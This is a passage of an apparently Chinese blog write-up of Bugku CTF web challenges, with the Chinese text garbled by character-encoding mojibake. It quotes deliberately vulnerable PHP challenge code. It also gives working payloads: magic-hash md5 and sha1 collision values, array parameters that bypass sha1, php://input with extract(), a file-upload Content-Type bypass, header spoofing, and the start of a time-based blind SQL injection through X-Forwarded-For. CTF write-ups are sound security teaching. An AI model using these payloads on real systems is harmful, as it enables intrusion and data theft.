class="hljs-number">0</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>strlen<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>E<span class="hljs-number">5</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>eregi<span class="hljs-variable">%28</span><span class="hljs-variable">%22111</span><span class="hljs-variable">%22</span>.substr<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%2</span>C<span class="hljs-number">0</span><span class="hljs-variable">%2</span>C<span class="hljs-number">1</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%221114</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>substr<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%2</span>C<span class="hljs-number">0</span><span class="hljs-variable">%2</span>C<span class="hljs-number">1</span><span class="hljs-variable">%29</span><span class="hljs-variable">%21</span><span class="hljs-variable">%3</span>D<span class="hljs-number">4</span><span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>require<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>f<span class="hljs-number">4</span>l<span class="hljs-number">2</span>a<span class="hljs-number">3</span>g.txt<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>Aelse<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>print<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span>never<span class="hljs-variable">%20</span>never<span class="hljs-variable">%20</span>never<span class="hljs-variable">%20</span>give<span class="hljs-variable">%20</span>up<span class="hljs-variable">%20</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E</code></pre><p>urlè§£ç ä¸ºæºç </p><p><img src="https://i.loli.net/2020/11/30/qpmSYCjHZGeRD8F.png" alt></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>f(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&#123;header(<span class="hljs-string">&#x27;Location: hello.php?id=1&#x27;</span>);<span class="hljs-keyword">exit</span>();&#125;<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;.&#x27;</span>))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no no no no no&#x27;</span>;<span class="hljs-keyword">return</span> ;&#125;<span class="hljs-variable">$data</span> = @file_get_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">&quot;bugku is a nice plateform!&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$id</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> strlen(<span class="hljs-variable">$b</span>)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> eregi(<span class="hljs-string">&quot;111&quot;</span>.substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&quot;1114&quot;</span>) <span class="hljs-keyword">and</span> substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)&#123;<span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;f4l2a3g.txt&quot;</span>); <span class="hljs-comment">//æ³¨æ„è¿™é‡Œï¼Œflagåº”è¯¥è—åœ¨è¿™é‡Œ</span>&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;never never never give up !!!&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>æœç„¶è—åœ¨f4l2a3g.txt</p><p><img src="https://i.loli.net/2020/11/30/ObAgHyeFnp9QM1G.png" alt></p><h2 id="è¿‡ç‹—ä¸€å¥è¯"><a href="#è¿‡ç‹—ä¸€å¥è¯" class="headerlink" title="è¿‡ç‹—ä¸€å¥è¯"></a>è¿‡ç‹—ä¸€å¥è¯</h2><p>æ­¤ç«™æ²¡æœ‰flagï¼Œflagè¢«äººåˆ äº†ï¼Œä¸ç”¨å†åšäº†ã€‚â€“ä¸€ä¸ªåšé¢˜çš„è·¯äºº</p><p>flagå¥½åƒçœŸçš„è¢«åˆ äº†ï¼Œåˆ—ä¸å‡ºæ¥ç›®å½•ï¼ŒæŸ¥çœ‹wpä¹Ÿæ²¡æœ‰å¤ç°ã€‚</p><h2 id="æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ"><a href="#æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ" class="headerlink" title="æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ"></a>æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> highlight_file(<span class="hljs-string">&#x27;2.php&#x27;</span>);<span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;KEY&#123;********************************&#125;&#x27;</span>;<span class="hljs-variable">$IM</span>= preg_match(<span class="hljs-string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]), <span class="hljs-variable">$match</span>);<span class="hljs-keyword">if</span>( <span class="hljs-variable">$IM</span> )&#123;  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;key is: &#x27;</span>.<span class="hljs-variable">$key</span>);&#125;</code></pre><p><code>preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</code></p><p>é‡ç‚¹åœ¨è¿™å¥è¯ä¸Šï¼Œè€ƒç‚¹ä¸ºæ­£åˆ™è¡¨è¾¾å¼</p><blockquote><p><strong>å®šç•Œç¬¦ï¼š</strong>/å’Œ/ï¼ˆä¸€èˆ¬æ¥è¯´æ˜¯è¿™ä¸¤ä¸ªï¼Œå…¶å®é™¤äº†\å’Œå­—æ¯æ•°å­—å…¶å®ƒçš„åªè¦æ˜¯æˆå¯¹å‡ºç°éƒ½å¯ä»¥çœ‹åšå®šç•Œç¬¦ï¼Œæ¯”å¦‚##ã€ï¼ï¼ä¹‹ç±»çš„ï¼‰ï¼›</p><p><strong>. ï¼ˆä¸€ä¸ªç‚¹ï¼‰ï¼š</strong>è¡¨ç¤ºå¯ä»¥åŒ¹é…ä»»ä½•å­—ç¬¦ï¼›</p><p><strong>*  ï¼š</strong>å‰é¢çš„å­—ç¬¦é‡å¤é›¶æ¬¡æˆ–å¤šæ¬¡ï¼›</p><p><strong>{n,m} ï¼š</strong>å‰é¢çš„å­—ç¬¦é‡å¤4~7æ¬¡ï¼›</p><p><strong>\ ï¼ˆåæ–œçº¿ï¼‰ï¼š</strong>åé¢çš„å­—ç¬¦è¢«è½¬ä¹‰ï¼›</p><p><strong>[a-z] ï¼š</strong>åœ¨aåˆ°zä¸­åŒ¹é… ï¼›</p><p><strong>[[:punct:]] ï¼š</strong>åŒ¹é…ä»»ä½•æ ‡ç‚¹ç¬¦å·ï¼›</p><p><strong>/i ï¼š</strong>è¡¨ç¤ºè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼›</p></blockquote><p>å› æ­¤å¯ä»¥å†™å‡ºç¬¦åˆè¦æ±‚çš„å­—ç¬¦ç©¿</p><pre><code class="hljs arcade">keyakey22222key:<span class="hljs-regexp">/a/</span>aaakeyb!</code></pre><h2 id="å‰å¥³å‹-SKCTF"><a href="#å‰å¥³å‹-SKCTF" class="headerlink" title="å‰å¥³å‹(SKCTF)"></a>å‰å¥³å‹(SKCTF)</h2><p>é¢˜ç›®ç½‘å€æ‰“ä¸å¼€</p><h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>é¢˜ç›®ç½‘å€æ‰“ä¸å¼€</p><h2 id="ä½ ä»å“ªé‡Œæ¥"><a href="#ä½ ä»å“ªé‡Œæ¥" class="headerlink" title="ä½ ä»å“ªé‡Œæ¥"></a>ä½ ä»å“ªé‡Œæ¥</h2><p>é¢˜ç›®æç¤º are you from google?</p><p>ä½ æ˜¯ä»googleæ¥çš„å—</p><p>è€ƒå¯Ÿhttpå¤´ä¸­çš„refererå‚æ•°</p><p><strong>Refererï¼šæµè§ˆå™¨å‘ WEB æœåŠ¡å™¨è¡¨æ˜è‡ªå·±æ˜¯ä»å“ªä¸ª ç½‘é¡µ/URL è·å¾—/ç‚¹å‡» å½“å‰è¯·æ±‚ä¸­çš„ç½‘å€/URLã€‚<br>ä¾‹å¦‚ï¼šRefererï¼š<a href="http://www.sina.com/">http://www.sina.com/</a></strong> </p><p>é‚£ä¹ˆå°±æŠ“åŒ…ä¿®æ”¹refererè¿™ä¸ªå‚æ•°</p><p><code>Referer: https://www.google.com/</code>,ç›´æ¥goå³å¯</p><h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>æºç </p><pre><code class="hljs php"><span class="hljs-variable">$md51</span> = md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);<span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<span class="hljs-variable">$md52</span> = @md5(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nctf&#123;*****************&#125;&quot;</span>;&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;</code></pre><p>å³ä½¿ç”¨getæ–¹å¼ä¼ é€’ä¸€ä¸ªå‚æ•°a,ä½¿å¾—açš„å€¼ä¸ç­‰äº<code>QNKCDZO</code>ä½†æ˜¯äºŒè€…çš„md5å€¼ç›¸åŒ</p><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p><p>å¸¸è§çš„payloadæœ‰</p><pre><code class="hljs stylus">QNKCDZO<span class="hljs-number">240610708</span>s878926199as155964671as214587387as214587387a sha1(str)<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaroZmOk&#x27;</span>)</span></span>  <span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaK1STfY&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaO8zKZF&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aa3OFF9m&#x27;</span>)</span></span></code></pre><h2 id="ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™"><a href="#ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™" class="headerlink" title="ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™"></a>ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™</h2><p>è§åˆ°é¢˜ç›®å°±æƒ³åˆ°äº†<code>x-forwarded-for</code>ï¼Œæœ¬åœ°åœ°å€å¯ä»¥ä½¿ç”¨IP:127.0.0.1</p><p>å¯ä»¥ä½¿ç”¨googleæµè§ˆå™¨çš„æ’ä»¶<img src="https://i.loli.net/2020/11/30/idlumxHC5tWKwvI.png" alt></p><p><img src="https://i.loli.net/2020/11/30/jswkU98VvSIgEJK.png" alt></p><p><img src="https://i.loli.net/2020/11/30/gE2JADOYGnLIloj.png" alt></p><h2 id="å„ç§ç»•è¿‡"><a href="#å„ç§ç»•è¿‡" class="headerlink" title="å„ç§ç»•è¿‡"></a>å„ç§ç»•è¿‡</h2><p>é¢˜ç›®æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>] == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;passwd can not be uname.&#x27;</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) === sha1(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])&amp;(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>))        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);    <span class="hljs-keyword">else</span>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;sorry!&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>é¦–å…ˆçœ‹ä¸€ä¸‹è¦ä¼ å…¥å“ªäº›å˜é‡</p><p>get:id uname</p><p>post:passwd</p><p>idéœ€è¦è¿›è¡Œä¸€æ¬¡urldecodeï¼Œè§£ç çš„å€¼ä¸ºmargin</p><p>unameä¸passwdä¸ç›¸åŒï¼Œä½†æ˜¯sha1å€¼è¦ç›¸åŒï¼Œå¹¶ä¸”æ˜¯ä¸¥æ ¼ç›¸ç­‰ ===ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨sha1å‡½æ•°çš„æ¼æ´ï¼Œæ— æ³•å¤„ç†æ•°ç»„ç±»å‹çš„å˜é‡ï¼Œæœ€åä¼šè¿”å›0ï¼Œä¹Ÿå¯ä»¥ç”¨sha1å¼ºç¢°æ’ã€‚</p><p>payload</p><pre><code class="hljs apache"><span class="hljs-attribute">urlencode</span>(margin)=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E<span class="hljs-attribute">uname</span>[]=<span class="hljs-number">1</span><span class="hljs-attribute">passwd</span>[]=<span class="hljs-number">2</span><span class="hljs-attribute">GET</span>: id=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E&amp;uname[]=<span class="hljs-number">1</span><span class="hljs-attribute">POST</span>:passwd[]=<span class="hljs-number">2</span></code></pre><p><img src="https://i.loli.net/2020/11/23/MPLxeWwG2BIYHbf.png" alt></p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>extract(<span class="hljs-variable">$_GET</span>);<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$ac</span>))&#123;<span class="hljs-variable">$f</span> = trim(file_get_contents(<span class="hljs-variable">$fn</span>));<span class="hljs-keyword">if</span> (<span class="hljs-variable">$ac</span> === <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="hljs-string">&quot; <span class="hljs-subst">$flag</span>&lt;/p&gt;&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><strong>extract</strong>å‡½æ•°ä½œç”¨</p><p>(PHP 4, PHP 5, PHP 7)</p><p>extract â€” ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨</p><p>è¯´æ˜</p><p>extract ( array <code>&amp;$array</code> [, int <code>$flags</code> = EXTR_OVERWRITE [, string <code>$prefix</code> = <strong><code>NULL</code></strong> ]] ) : int</p><p>æœ¬å‡½æ•°ç”¨æ¥å°†å˜é‡ä»æ•°ç»„ä¸­å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚</p><p>æ£€æŸ¥æ¯ä¸ªé”®åçœ‹æ˜¯å¦å¯ä»¥ä½œä¸ºä¸€ä¸ªåˆæ³•çš„å˜é‡åï¼ŒåŒæ—¶ä¹Ÿæ£€æŸ¥å’Œç¬¦å·è¡¨ä¸­å·²æœ‰çš„å˜é‡åçš„å†²çªã€‚</p><p><strong>trim</strong></p><p>(PHP 4, PHP 5, PHP 7)</p><p>trim â€” å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰</p><p>è¯´æ˜</p><p>trim ( string <code>$str</code> [, string <code>$character_mask</code> = â€œ \t\n\r\0\x0Bâ€ ] ) : string</p><p>æ­¤å‡½æ•°è¿”å›å­—ç¬¦ä¸² <code>str</code> å»é™¤é¦–å°¾ç©ºç™½å­—ç¬¦åçš„ç»“æœã€‚å¦‚æœä¸æŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ï¼Œ<strong>trim()</strong> å°†å»é™¤è¿™äº›å­—ç¬¦ï¼š</p><ul><li>â€œ â€œ (ASCII <code>32</code> (<code>0x20</code>))ï¼Œæ™®é€šç©ºæ ¼ç¬¦ã€‚</li><li>â€œ\tâ€ (ASCII <code>9</code> (<code>0x09</code>))ï¼Œåˆ¶è¡¨ç¬¦ã€‚</li><li>â€œ\nâ€ (ASCII <code>10</code> (<code>0x0A</code>))ï¼Œæ¢è¡Œç¬¦ã€‚</li><li>â€œ\râ€ (ASCII <code>13</code> (<code>0x0D</code>))ï¼Œå›è½¦ç¬¦ã€‚</li><li>â€œ\0â€ (ASCII <code>0</code> (<code>0x00</code>))ï¼Œç©ºå­—èŠ‚ç¬¦ã€‚</li><li>â€œ\x0Bâ€ (ASCII <code>11</code> (<code>0x0B</code>))ï¼Œå‚ç›´åˆ¶è¡¨ç¬¦ã€‚</li></ul><p><strong>file_get_contents</strong></p><p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7)</p><p>file_get_contents â€” å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><p>ä»£ç çš„å¤§è‡´å«ä¹‰å°±æ˜¯</p><p>getæ–¹å¼æäº¤å‚æ•°ï¼Œç”¨extractå‡½æ•°å°†å˜é‡å†™å…¥ç¬¦å·è¡¨ä¸­ï¼Œå¦‚æœgetæäº¤çš„å‚æ•°ä¸­åŒ…å«$acï¼Œåˆ™åˆ©ç”¨file_get_contentå‡½æ•°ä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹å¹¶èµ‹å€¼ç»™$f,å¦‚æœ$ac===$fåˆ™æ‹¿åˆ°flag</p><p>è¿™é‡Œéœ€è¦åˆ©ç”¨phpçš„ä¼ªåè®®å†™å…¥å†…å®¹ php://input</p><p>payload</p><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span> ac=<span class="hljs-number">111</span><span class="hljs-variable">&amp;fn</span>=php:<span class="hljs-comment">//input</span><span class="hljs-symbol">POST:</span> <span class="hljs-number">111</span></code></pre><h2 id="ç»†å¿ƒ"><a href="#ç»†å¿ƒ" class="headerlink" title="ç»†å¿ƒ"></a>ç»†å¿ƒ</h2><p>é¢˜ç›®ç½‘ç«™å´©äº†</p><h2 id="æ±‚getshell"><a href="#æ±‚getshell" class="headerlink" title="æ±‚getshell"></a>æ±‚getshell</h2><p>æ–‡ä»¶ä¸Šä¼ </p><p>é¦–å…ˆå…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œä¸Šä¼ æˆåŠŸäº†å¹¶è¿”å›ä¿å­˜è·¯å¾„</p><p>å†ä¸Šä¼ ä¸€ä¸ªphpçš„æ–‡ä»¶ï¼Œæç¤º<code>Invalid file</code></p><p>ä¸Šä¼ .htaccess, .user.iniéƒ½æç¤º<code>you got it</code></p><p>ä¸¤ç§æç¤ºä¸ä¸€æ ·çŒœæµ‹å¯èƒ½å­˜åœ¨åç¼€é»‘åå•å’Œæ–‡ä»¶ç±»å‹æ£€æµ‹ã€‚</p><p>ä¸Šä¼ ä¸€ä¸ªphp5æ–‡ä»¶å¹¶bpæŠ“åŒ…ä¿®æ”¹MIME(Content-Type)ä¸º image/.jpegè¿˜æ˜¯æç¤ºinvalid file </p><p><img src="https://i.loli.net/2020/11/23/FgbfWmJIoNxpw7V.png" alt="getshell1.png"></p><p>å†ä¿®æ”¹è¯·æ±‚å¤´éƒ¨çš„Content-Typeï¼Œåˆ©ç”¨å¤§å°å†™ç»•è¿‡ï¼ŒæˆåŠŸæ‹¿åˆ°flag</p><p><img src="https://i.loli.net/2020/11/23/w2bYAuHngShyXCI.png" alt="getshell2.png"></p><p>è€ƒå¯ŸçŸ¥è¯†ç‚¹ï¼š</p><p><strong>è¯·æ±‚ä¸­çš„Content-Type</strong></p><p>åœ¨è¯·æ±‚ä¸­ (å¦‚POST æˆ– PUT)ï¼ŒContent-Typeå­—æ®µç”¨äºå®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡å™¨å®é™…å‘é€çš„æ•°æ®ç±»å‹ã€‚å½“ä½ å‘é€ä¸€ä¸ªHTTPçš„POSTè¯·æ±‚æ—¶ï¼Œéœ€è¦è®¾ç½®è¯·æ±‚å¤´ä¸­çš„Content-Typeå­—æ®µï¼Œå‘Šè¯‰æœåŠ¡ç«¯ä½ å‘é€çš„æ•°æ®æ˜¯ä»€ä¹ˆç±»å‹çš„ã€‚</p><p><strong>è®¾ç½®è¯·æ±‚å¤´ä¸­çš„Content-Type</strong></p><p>å½“å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·HTTPçš„POSTè¯·æ±‚æ—¶ï¼Œéœ€è¦å‘Šè¯‰æœåŠ¡ç«¯ï¼Œæˆ‘ä»¬å‘é€çš„æ•°æ®ç±»å‹ï¼Œæ–¹ä¾¿æœåŠ¡ç«¯å»è§£ææ•°æ®ã€‚å¦‚æœä½ ä¸è®¾ç½®ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯å¯èƒ½æ— æ³•å¤„ç†ä½ çš„è¯·æ±‚ã€‚</p><h2 id="INSERT-INTOæ³¨å…¥"><a href="#INSERT-INTOæ³¨å…¥" class="headerlink" title="INSERT INTOæ³¨å…¥"></a>INSERT INTOæ³¨å…¥</h2><p>æç¤ºäº†insert intoæ³¨å…¥</p><p>å¹¶ç»™å‡ºäº†æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIp</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123; <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦å­˜åœ¨xxf</span><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<span class="hljs-comment">//å­˜åœ¨åˆ™ä¼˜å…ˆä½¿ç”¨xxf</span>&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="hljs-comment">//remote_addr</span>&#125;<span class="hljs-variable">$ip_arr</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$ip</span>);<span class="hljs-comment">//è¿‡æ»¤ ,</span><span class="hljs-keyword">return</span> <span class="hljs-variable">$ip_arr</span>[<span class="hljs-number">0</span>];&#125;<span class="hljs-variable">$host</span>=<span class="hljs-string">&quot;localhost&quot;</span>;<span class="hljs-variable">$user</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$pass</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$db</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$connect</span> = mysql_connect(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to connect&quot;</span>);<span class="hljs-comment">//è¿æ¥æ•°æ®åº“</span>mysql_select_db(<span class="hljs-variable">$db</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to select database&quot;</span>);<span class="hljs-variable">$ip</span> = getIp();<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;your ip is :&#x27;</span>.<span class="hljs-variable">$ip</span>;<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into client_ip (ip) values (&#x27;<span class="hljs-subst">$ip</span>&#x27;)&quot;</span>; <span class="hljs-comment">//æ³¨å…¥ç‚¹</span>mysql_query(<span class="hljs-variable">$sql</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>ç½‘é¡µæ˜¾ç¤ºå‡ºè‡ªå·±çš„ipåœ°å€ï¼Œæƒ³åˆ°çš„æ˜¯xffå¤´ï¼Œä¿®æ”¹äº†xffå¤´çš„å†…å®¹åï¼Œé¡µé¢å›æ˜¾ä¹Ÿä¼šæ”¹å˜ï¼Œæ‰€ä»¥å°±æ˜¯xffæ³¨å…¥ã€‚</p><p>æŠ“åŒ…æ·»åŠ xxfå¤´ï¼Œå¹¶æ„é€ æ³¨å…¥è¯­å¥,è¿™é‡Œå› ä¸ºè¿‡æ»¤äº†é€—å·ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ifè¯­å¥ï¼Œåˆå› ä¸ºæ²¡æœ‰å›æ˜¾æ‰€ä»¥è¦ä½¿ç”¨åŸºäºæ—¶é—´çš„ç›²æ³¨</p><pre><code class="hljs awk"><span class="hljs-variable">$ip_arr</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$ip</span>);   <span class="hljs-regexp">//</span>è¿‡æ»¤äº†,</code></pre><p>ä»£æ›¿ifçš„æ³¨å…¥è¯­å¥å¦‚ä¸‹</p><pre><code class="hljs ada"><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> 